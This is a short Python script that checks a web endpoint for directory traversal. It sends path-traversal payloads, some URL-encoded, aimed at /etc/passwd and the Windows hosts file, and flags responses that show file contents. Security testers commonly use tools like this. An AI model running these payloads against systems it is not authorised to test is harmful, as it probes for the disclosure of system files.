import requests


def test_directory_traversal(url, param_name):
    payloads = [
        "../../../../etc/passwd",
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "..\\..\\..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
        "..%5C..%5C..%5C..%5C..%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts",
        "../" * 10 + "etc/passwd",
        "../" * 10 + "Windows/System32/drivers/etc/hosts"
    ]

    for payload in payloads:
        params = {param_name: payload}
        response = requests.get(url, params=params)
        if "root:x:" in response.text or "127.0.0.1" in response.text:
            print(f"Potential Directory Traversal vulnerability detected with payload: {payload}")
        else:
            print(f"No vulnerability detected with payload: {payload}")


url = "http://example.com/download"
param_name = "file"
test_directory_traversal(url, param_name)
